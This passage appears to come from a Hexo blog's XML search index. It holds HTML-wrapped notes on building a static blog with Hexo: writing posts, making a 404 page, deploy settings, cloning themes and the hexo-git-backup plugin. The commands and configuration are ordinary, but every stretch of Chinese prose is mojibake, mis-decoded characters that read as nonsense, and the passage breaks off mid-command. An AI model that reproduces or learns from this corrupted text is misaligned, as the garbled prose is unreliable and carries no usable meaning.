#å›¾ç‰‡</span><br><span class="line">|   |   â””â”€â”€ style.styl   #*.stylå¼•å…¥éœ€è¦çš„cssæºç </span><br><span class="line">|   â”œâ”€â”€ fancybox         #fancyboxæ•ˆæœæºç </span><br><span class="line">|   â””â”€â”€ js               #javascriptæºä»£ç </span><br><span class="line">â”œâ”€â”€ _config.yml          #ä¸»é¢˜é…ç½®æ–‡ä»¶</span><br><span class="line">â””â”€â”€ README.md            #ç”¨GitHubçš„éƒ½çŸ¥é“</span><br></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/luuman/luuman.github.io/master/resoures/iPhone6-mockup.jpg" title="iPhone6" class="gallery-item"><img src="https://raw.githubusercontent.com/luuman/luuman.github.io/master/resoures/iPhone6-mockup.jpg" alt="iPhone6"></a></p><h2 id="å…³äºHexoè¿ç§»"><a href="#å…³äºHexoè¿ç§»" class="headerlink" title="å…³äºHexoè¿ç§»"></a>å…³äºHexoè¿ç§»</h2><p>æœ€è¿‘ï¼ŒWaterstrongæäº¤äº†ä¸€ç‰ˆï¼Œè¿™ç‰ˆæœ¬å¯ä»¥å°†hexoå¸ƒç½®åœ¨GitHubå…¶ä¸‹çš„å…¶ä»–é¡¹ç›®ï¼Œæ¯”å¦‚Blogç­‰ã€‚ä½†æ˜¯è¿˜æ˜¯æœ‰äº›ä¸œè¥¿éœ€è¦ä¿®æ”¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># URL #è¿™é¡¹æš‚ä¸é…ç½®ï¼Œç»‘å®šåŸŸååï¼Œæ¬²åˆ›å»ºsitemap.xmléœ€è¦é…ç½®è¯¥é¡¹</span><br><span class="line">## If your site is put in a subdirectory, set url as &#39;http:&#x2F;&#x2F;yoursite.com&#x2F;child&#39; and root as &#39;&#x2F;child&#x2F;&#39;</span><br><span class="line">url: http:&#x2F;&#x2F;luuman.github.io&#x2F;Blog&#x2F;</span><br><span class="line">root: &#x2F;Blog&#x2F;</span><br><span class="line">permalink: :year&#x2F;:month&#x2F;:day&#x2F;:title&#x2F;</span><br><span class="line">permalink_defaults:</span><br><span class="line"></span><br><span class="line">ä¸Šä¼ æ˜¯éœ€è¦å‡ºå…¥å¯†ç </span><br><span class="line"></span><br><span class="line"># Deployment ç«™ç‚¹éƒ¨ç½²åˆ°githubè¦é…ç½®ï¼Œä¸Šä¸€èŠ‚ä¸­å·²ç»è®²è¿‡</span><br><span class="line">## Docs: http:&#x2F;&#x2F;zespia.tw&#x2F;hexo&#x2F;docs&#x2F;deploy.html</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  #repository: git@github.com:luuman&#x2F;Blog.git</span><br><span class="line">  repository: https:&#x2F;&#x2F;github.com&#x2F;luuman&#x2F;Blog.git</span><br><span class="line">  branch: gh-pages</span><br></pre></td></tr></table></figure><p>éå¸¸æ„Ÿè°¢Waterstrong</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexoçš„ä½¿ç”¨ä»‹ç»</title>
      <link href="Hexo-use-Introduction.html"/>
      <url>Hexo-use-Introduction.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>ã€€ã€€<strong>è‡ªç”¨ç¬”è®°ï¼š</strong>æœ¬æ–‡å±äºè‡ªç”¨ç¬”è®°ï¼Œä¸åšè¯¦è§£ï¼Œä»…ä¾›å‚è€ƒã€‚åœ¨æ­¤è®°å½•è‡ªå·±å·²ç†è§£å¹¶å¼€å§‹éµå¾ªçš„å‰ç«¯ä»£ç è§„èŒƒã€‚What How Why<br>ã€€ã€€æœ€è¿‘ï¼Œä½¿ç”¨Hexoé‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œåœ¨è®¾ç«‹è¿›è¡Œæ•´ç†ã€‚</p><h3 id="å†™æ–‡ç« "><a href="#å†™æ–‡ç« " class="headerlink" title="å†™æ–‡ç« "></a>å†™æ–‡ç« </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ hexo n #å†™æ–‡ç«  </span><br><span class="line"></span><br><span class="line">    å…¶ä¸­my new postä¸ºæ–‡ç« æ ‡é¢˜ï¼Œæ‰§è¡Œå‘½ä»¤åã€‚</span><br><span class="line">    ä¼šåœ¨é¡¹ç›®\source_postsä¸­ç”Ÿæˆmy new post.mdæ–‡ä»¶ï¼Œç”¨ç¼–è¾‘å™¨æ‰“å¼€ç¼–å†™å³å¯ã€‚</span><br><span class="line"></span><br><span class="line">    å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥åœ¨\source_postsä¸­æ–°å»ºä¸€ä¸ªmdæ–‡ä»¶ï¼Œæˆ‘å°±æ˜¯è¿™ä¹ˆåšçš„ã€‚</span><br><span class="line"></span><br><span class="line">    æ–‡ç« å¼€å¤´è¯­æ³•ï¼š</span><br><span class="line"></span><br><span class="line">title: name #æ–‡ç« æ ‡é¢˜</span><br><span class="line">date: 2015-12-25 18:29:00  #å†™ä½œæ—¶é—´</span><br><span class="line">description: #æ–‡ç« æè¿°</span><br><span class="line">categories: #æ–‡ç« åˆ†ç±»</span><br><span class="line">- å»ºç«™</span><br><span class="line">tags: #æ–‡ç« æ ‡ç­¾</span><br><span class="line">- åšå®¢</span><br><span class="line">- å»ºç«™</span><br><span class="line">- Hexo</span><br><span class="line">toc: true # ç”Ÿæˆç›®å½•</span><br><span class="line">author:</span><br><span class="line">comments:</span><br><span class="line">original:</span><br><span class="line">permalink: #æŒ‡å®šé“¾æ¥</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">    ä»¥ä¸Šæ˜¯æ‘˜è¦</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br><span class="line">    ä»¥ä¸‹æ˜¯ä½™ä¸‹å…¨æ–‡</span><br></pre></td></tr></table></figure><h3 id="å†™å¤šç§æ–‡ç« "><a href="#å†™å¤šç§æ–‡ç« " class="headerlink" title="å†™å¤šç§æ–‡ç« "></a>å†™å¤šç§æ–‡ç« </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new [layout] &quot;postName&quot; #æ–°å»ºæ–‡ç« </span><br><span class="line"></span><br><span class="line">    [layout]ï¼šå…¶ä¸­layoutæ˜¯å¯é€‰å‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºpostã€‚</span><br><span class="line">    æœ‰å“ªäº›layoutå‘¢ï¼Œè¯·åˆ° scaffolds ç›®å½•ä¸‹æŸ¥çœ‹ï¼Œè¿™äº›æ–‡ä»¶åç§°å°±æ˜¯layoutåç§°ã€‚</span><br><span class="line">    å½“ç„¶ä½ å¯ä»¥æ·»åŠ è‡ªå·±çš„layoutï¼Œæ–¹æ³•å°±æ˜¯æ·»åŠ ä¸€ä¸ªæ–‡ä»¶å³å¯ã€‚</span><br><span class="line">    åŒæ—¶ä½ ä¹Ÿå¯ä»¥ç¼–è¾‘ç°æœ‰çš„layoutï¼Œæ¯”å¦‚postçš„layouté»˜è®¤æ˜¯ hexo\scaffolds\post.md</span><br><span class="line"></span><br><span class="line">    å…³äºhexo\scaffolds\photo.mdé…ç½®æ–‡ä»¶çš„ä»‹ç»ï¼š</span><br><span class="line"></span><br><span class="line">layout: &#123; &#123; layout &#125; &#125; #layoutåç§°</span><br><span class="line">title: &#123; &#123; title &#125; &#125; #æ–‡ç« æ ‡é¢˜</span><br><span class="line">date: &#123; &#123; date &#125; &#125; #æ–‡ç« ç”Ÿæˆæ—¶é—´</span><br><span class="line">ategories: #æ–‡ç« åˆ†ç±»ç›®å½•</span><br><span class="line">tags:  #æ–‡ç« æ ‡ç­¾</span><br><span class="line">-  #</span><br><span class="line">photos:  #</span><br><span class="line">-  #</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">layout: photo</span><br><span class="line">title: æˆ‘çš„é˜…å†</span><br><span class="line">date: 2085-01-16 07:33:44</span><br><span class="line">tags: [hexo]</span><br><span class="line">photos:</span><br><span class="line">- http:&#x2F;&#x2F;bruce.u.qiniudn.com&#x2F;2013&#x2F;11&#x2F;27&#x2F;reading&#x2F;photos-0.jpg</span><br><span class="line">- http:&#x2F;&#x2F;bruce.u.qiniudn.com&#x2F;2013&#x2F;11&#x2F;27&#x2F;reading&#x2F;photos-1.jpg</span><br></pre></td></tr></table></figure><h3 id="è‡ªå®šä¹‰é¡µé¢"><a href="#è‡ªå®šä¹‰é¡µé¢" class="headerlink" title="è‡ªå®šä¹‰é¡µé¢"></a>è‡ªå®šä¹‰é¡µé¢</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    æ‰§è¡Œnew pageå‘½ä»¤</span><br><span class="line"></span><br><span class="line">$ hexo new page &quot;about&quot;</span><br><span class="line"></span><br><span class="line">    åœ¨ *hexo\source\* ä¸‹ä¼šç”Ÿæˆ *about* ç›®å½•ï¼Œ</span><br><span class="line">    é‡Œé¢æœ‰ä¸ªindex.mdï¼Œç›´æ¥ç¼–è¾‘å°±å¯ä»¥äº†ï¼Œ</span><br><span class="line">    ç„¶ååœ¨ä¸»é¢˜çš„ *_config.yml* ä¸­å°†å…¶é…ç½®æ˜¾ç¤ºå‡ºæ¥ã€‚ </span><br><span class="line"></span><br><span class="line">    ä¸Šè¿°æ­¥éª¤ï¼Œä¹Ÿå¯ä»¥æ‰‹å·¥ç”Ÿæˆï¼Œåœ¨ *hexo\source\* ä¸‹æ‰‹å·¥æ–°å»º</span><br><span class="line">     *about* å’Œ *index.md* ä¹Ÿæ˜¯å®Œå…¨ç­‰ä»·çš„ã€‚</span><br><span class="line"></span><br><span class="line">    å› ä¸ºmarkdownå¯¹tableçš„æ”¯æŒä¸å¥½ï¼Œæˆ‘æ˜¯åœ¨aboutä¸­ç›´æ¥</span><br><span class="line">    å»ºç«‹index.htmlï¼Œé‡Œé¢ä¹¦å†™é¡µé¢å†…å®¹ï¼Œhexoä¼šå¸®ä½ åŠ ä¸Šå¤´å’Œå°¾ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å†™é¡µé¢ï¼ˆ404ï¼‰"><a href="#å†™é¡µé¢ï¼ˆ404ï¼‰" class="headerlink" title="å†™é¡µé¢ï¼ˆ404ï¼‰"></a>å†™é¡µé¢ï¼ˆ404ï¼‰</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new page &quot;404&quot;</span><br><span class="line"></span><br><span class="line">UUhike@UUhike-pc MINGW64 &#x2F;d&#x2F;Hexo&#x2F;Hexo (master)</span><br><span class="line">$ hexo new page &quot;404&quot;</span><br><span class="line">INFO  Created: D:\Hexo\Hexo\source\404\index-1.md</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">title: 404 Not Foundï¼šè¯¥é¡µæ— æ³•æ˜¾ç¤º</span><br><span class="line">comments: false</span><br><span class="line">permalink: &#x2F;404</span><br><span class="line">fancybox: false</span><br><span class="line">---</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">    .article-title &#123;</span><br><span class="line">        font-size: 2.1em;</span><br><span class="line">    &#125;</span><br><span class="line">    strong a &#123;</span><br><span class="line">        color: #747474;</span><br><span class="line">    &#125;</span><br><span class="line">    .share &#123;</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">    .player &#123;</span><br><span class="line">        margin-left: -10px;</span><br><span class="line">    &#125;</span><br><span class="line">    .sign &#123;</span><br><span class="line">        text-align: right;</span><br><span class="line">        font-style: italic;</span><br><span class="line">    &#125;</span><br><span class="line">    #page-visit &#123;</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">    .center &#123;</span><br><span class="line">        text-align: center;</span><br><span class="line">        height: 2.5em;</span><br><span class="line">        font-weight: bold;</span><br><span class="line">    &#125;</span><br><span class="line">    .search2 &#123;</span><br><span class="line">        height: 2.2em;</span><br><span class="line">        font-size: 1em;</span><br><span class="line">        width: 50%;</span><br><span class="line">        margin: auto 24%;</span><br><span class="line">        color: #727272;</span><br><span class="line">        opacity: .6;</span><br><span class="line">        border: 2px solid lightgray;</span><br><span class="line">    &#125;</span><br><span class="line">    .search2:hover &#123;</span><br><span class="line">        opacity: 1;</span><br><span class="line">        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3)</span><br><span class="line">        &#125;;</span><br><span class="line">    .article-entry hr &#123;</span><br><span class="line">        margin: 0;</span><br><span class="line">    &#125;</span><br><span class="line">    .pic &#123;</span><br><span class="line">        text-align: center;</span><br><span class="line">        margin: 0;</span><br><span class="line">    &#125;</span><br><span class="line">    .pic br &#123;</span><br><span class="line">        display: none;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br><span class="line">***</span><br><span class="line"></span><br><span class="line">&lt;div class&#x3D;&quot;pic&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&#x2F;resources&#x2F;Mihawk-Wind.gif&quot; title&#x3D;&quot;Mihawk-Wind&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;p class&#x3D;&quot;center&quot;&gt;å¾ˆæŠ±æ­‰ï¼Œæ‚¨æ‰€è®¿é—®çš„åœ°å€å¹¶ä¸å­˜åœ¨: &lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p class&#x3D;&quot;center&quot;&gt;&lt;a href&#x3D;&quot;&#x2F;&quot;&gt;å›ä¸»é¡µ&lt;&#x2F;a&gt; Â· &lt;a href&#x3D;&quot;&#x2F;archives&quot;&gt;æ‰€æœ‰æ–‡ç« &lt;&#x2F;a&gt; Â· &lt;a href&#x3D;&quot;&#x2F;about&quot;&gt;ç•™è¨€æ¿&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p class&#x3D;&quot;center&quot;&gt;å¯åœ¨è¾¹æ æœç´¢æ¡†ä¸­å¯¹æœ¬ç«™è¿›è¡Œæ£€ç´¢ï¼Œä»¥è·å–ç›¸å…³ä¿¡æ¯ã€‚&lt;&#x2F;p&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style&#x3D;&quot;text-align: center&quot;&gt;</span><br><span class="line">ä»¥ä¸‹æ˜¯åšä¸»å–œæ¬¢çš„ä¸€äº›æ­Œæ›²ï¼Œå¯ä»¥å¬å¬ï¼Œç¨ä½œä¼‘æ¯~</span><br><span class="line">&lt;iframe frameborder&#x3D;&quot;no&quot; border&#x3D;&quot;0&quot; marginwidth&#x3D;&quot;0&quot; marginheight&#x3D;&quot;0&quot; width&#x3D;320 height&#x3D;330 src&#x3D;&quot;http:&#x2F;&#x2F;music.163.com&#x2F;outchain&#x2F;player?type&#x3D;0&amp;id&#x3D;112513213&amp;auto&#x3D;0&amp;height&#x3D;430&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h3 id="å‘å¸ƒåšå®¢å†…å®¹"><a href="#å‘å¸ƒåšå®¢å†…å®¹" class="headerlink" title="å‘å¸ƒåšå®¢å†…å®¹"></a>å‘å¸ƒåšå®¢å†…å®¹</h3><p>å®ç°å‘å¸ƒï¼Œå‰ææ˜¯é…ç½®å¥½ï¼Œéƒ¨ç½²åˆ°Githubå‰éœ€è¦é…ç½®_config.ymlæ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: http:&#x2F;&#x2F;hexo.io&#x2F;docs&#x2F;deployment.html</span><br><span class="line">deploy:</span><br><span class="line">  type: github</span><br><span class="line">  repository: git@github.com:zhchnchn&#x2F;zhchnchn.github.io.git</span><br><span class="line">  branch: master</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ›´æ–°çš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¯èƒ½ä¼šæœ‰Bugï¼Œè‡ªè¡Œç™¾åº¦ï¼Œå¥½åƒè¦ä¿®æ”¹typeï¼šgitã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server #å¼€å¯é¢„è§ˆè®¿é—®ç«¯å£ï¼ˆé»˜è®¤ç«¯å£4000ï¼Œ&#39;ctrl + c&#39;å…³é—­serverï¼‰Hexo ä¼šç›‘è§†æ–‡ä»¶å˜åŠ¨å¹¶è‡ªåŠ¨æ›´æ–°ï¼Œæ‚¨æ— é¡»é‡å¯æœåŠ¡å™¨ã€‚</span><br><span class="line"></span><br><span class="line">$ hexo g #ç”Ÿæˆ</span><br><span class="line">$ hexo generate #ç”Ÿæˆé™æ€é¡µé¢è‡³publicç›®å½•ï¼ˆæœ€ç»ˆä¸Šä¼ è¿™ä¸ªæ–‡ä»¶åˆ°GitHubï¼‰</span><br><span class="line"></span><br><span class="line">$ hexo d &#x3D;&#x3D; hexo deploy#éƒ¨ç½²</span><br><span class="line">$ hexo d #éƒ¨ç½² # å¯ä¸hexo gåˆå¹¶ä¸º hexo d -g</span><br><span class="line"></span><br><span class="line">$ hexo deploy -g</span><br><span class="line">$ hexo server -g # ç”Ÿæˆé»˜è®¤æ–‡ä»¶ç¾¤å†æ‰§è¡Œ,å¼€å¯æœ¬åœ°é™æ€htmlæœåŠ¡å™¨</span><br></pre></td></tr></table></figure><h3 id="ä¸»é¢˜çš„æ›´æ”¹"><a href="#ä¸»é¢˜çš„æ›´æ”¹" class="headerlink" title="ä¸»é¢˜çš„æ›´æ”¹"></a>ä¸»é¢˜çš„æ›´æ”¹</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1. å°†Git Shell åˆ‡åˆ°&#x2F;D&#x2F;Hexoç›®å½•ä¸‹ï¼Œç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå°†pacmanä¸‹è½½åˆ° themes&#x2F;pacman ç›®å½•ä¸‹ã€‚</span><br><span class="line"></span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;A-limon&#x2F;pacman.git themes&#x2F;pacman</span><br><span class="line">2. ä¿®æ”¹ä½ çš„åšå®¢æ ¹ç›®å½•&#x2F;D&#x2F;Hexoä¸‹çš„config.ymlé…ç½®æ–‡ä»¶ä¸­çš„themeå±æ€§ï¼Œå°†å…¶è®¾ç½®ä¸ºpacmanã€‚</span><br><span class="line"></span><br><span class="line">3. æ›´æ–°pacmanä¸»é¢˜</span><br><span class="line"></span><br><span class="line">$ cd themes&#x2F;pacman</span><br><span class="line">$ git pull</span><br><span class="line"></span><br><span class="line">NOTEï¼šå…ˆå¤‡ä»½_config.yml æ–‡ä»¶åå†å‡çº§</span><br><span class="line"></span><br><span class="line">ä¸»é¢˜ï¼š</span><br><span class="line">    yilia</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;litten&#x2F;hexo-theme-yilia.git themes&#x2F;yilia</span><br><span class="line">    modernist</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;heroicyang&#x2F;hexo-theme-modernist.git themes&#x2F;modernist</span><br><span class="line">    jacman</span><br><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;cnfeat&#x2F;cnfeat.git themes&#x2F;jacman</span><br></pre></td></tr></table></figure><h3 id="æ–‡ç« å›¾ç‰‡è·¯å¾„"><a href="#æ–‡ç« å›¾ç‰‡è·¯å¾„" class="headerlink" title="æ–‡ç« å›¾ç‰‡è·¯å¾„"></a>æ–‡ç« å›¾ç‰‡è·¯å¾„</h3><p>Hexoå¦‚ä½•æ–¹å¼å›¾ç‰‡ï¼Œå›¾ç‰‡åº”è¯¥æ”¾ç½®åˆ°å“ªé‡Œï¼Œä¸ä¼šåº”ä¸ºä¸Šä¼ è€Œè¦†ç›–æ‰ã€‚ç„¶åæŠŠæ–‡ç« é‡Œçš„index.mdåˆ é™¤ï¼Œå°†æ–‡ä»¶å­˜æ”¾åœ¨resourceæ–‡ä»¶å¤¹ä¸­é—´ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    å‘å¸ƒé¡µé¢</span><br><span class="line">$ hexo new page &quot;name&quot; # æ–°å»ºä¸€ä¸ªé¡µé¢ï¼Œé¡µé¢åç§°name</span><br><span class="line"></span><br><span class="line">    UUhike@UUhike-pc MINGW64 &#x2F;d&#x2F;Hexo&#x2F;Hexo (master)</span><br><span class="line">$ hexo new page &quot;resoures&quot;</span><br><span class="line">    INFO  Created: D:\Hexo\Hexo\source\resoures\index.md</span><br></pre></td></tr></table></figure><h3 id="Hexoæ–‡ä»¶å¤‡ä»½"><a href="#Hexoæ–‡ä»¶å¤‡ä»½" class="headerlink" title="Hexoæ–‡ä»¶å¤‡ä»½"></a>Hexoæ–‡ä»¶å¤‡ä»½</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">    git-backup.</span><br><span class="line"></span><br><span class="line">    Install</span><br><span class="line"></span><br><span class="line">    if your hexo version is 2.x.x, you should install as follow:</span><br><span class="line"></span><br><span class="line">$ npm install hexo-git-backup@0.0.91 --save</span><br><span class="line">    if version is 3.x.x, you should install as follow:</span><br><span class="line"></span><br><span class="line">$ npm install hexo-git-backup --save</span><br><span class="line">    Update</span><br><span class="line"></span><br><span class="line">    if you install with --save, you must remove firstly when you update it.</span><br><span class="line"></span><br><span class="line">$ npm remove hexo-git-backup</span><br><span class="line">$ npm install hexo-git-backup --save</span><br><span class="line">    Configure</span><br><span class="line"></span><br><span class="line">    You should configure this plugin in _config.yml.</span><br><span class="line"></span><br><span class="line">backup:</span><br><span class="line">    type: git</span><br><span class="line">    repository:</span><br><span class="line">       github: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">       gitcafe: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">Using</span><br><span class="line"></span><br><span class="line">hexo backup </span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">hexo b</span><br><span class="line">Options</span><br><span class="line"></span><br><span class="line">if you want to back up with your theme,just add theme: your theme name,your theme name in _config.yml.</span><br><span class="line"></span><br><span class="line">backup:</span><br><span class="line">    type: git</span><br><span class="line">    theme: coney,landscape,xxx</span><br><span class="line">    repository:</span><br><span class="line">       github: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">       gitcafe: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">Attention: if you do as above, the dir themes&#x2F;coney&#x2F;.gitwill be removed</span><br><span class="line"></span><br><span class="line">if you want DIY commit message, just add &#39;message: update xxx&#39;.</span><br><span class="line"></span><br><span class="line">backup:</span><br><span class="line">    type: git</span><br><span class="line">    message: update xxx</span><br><span class="line">    repository:</span><br><span class="line">       github: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">       gitcafe: git@github.com:xxx&#x2F;xxx.git,branchName</span><br><span class="line">Now you can backup all the blog!</span><br><span class="line"></span><br><span class="line">Problems</span><br><span class="line"></span><br><span class="line">You may get some troubles by your computer&#39; permissionã€‚</span><br><span class="line"></span><br><span class="line">Error: EISDIR, open</span><br><span class="line"></span><br><span class="line">it is caused by permission. just do &#39;sudo hexo b&#39;</span><br><span class="line"></span><br><span class="line">sudo 